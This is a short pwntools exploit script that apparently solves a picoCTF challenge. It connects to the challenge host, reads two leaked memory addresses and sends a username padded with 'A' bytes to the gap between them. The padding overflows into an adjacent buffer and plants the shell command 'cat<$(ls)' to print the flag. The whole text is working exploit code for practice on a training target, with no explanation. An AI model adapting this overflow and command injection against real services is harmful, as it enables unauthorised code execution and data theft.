from pwn import *

HOST = "amiable-citadel.picoctf.net"
PORT = 58596

p = remote(HOST, PORT)
user_address = int(p.recvline().strip().split()[-1], 16)
shell_address = int(p.recvline().strip().split()[-1], 16)
diff = shell_address - user_address

p.recvuntil(b"username: ")

name = b"A" * diff + b"cat<$(ls)\n"
p.sendline(name)
flag = p.recvline()
print(flag)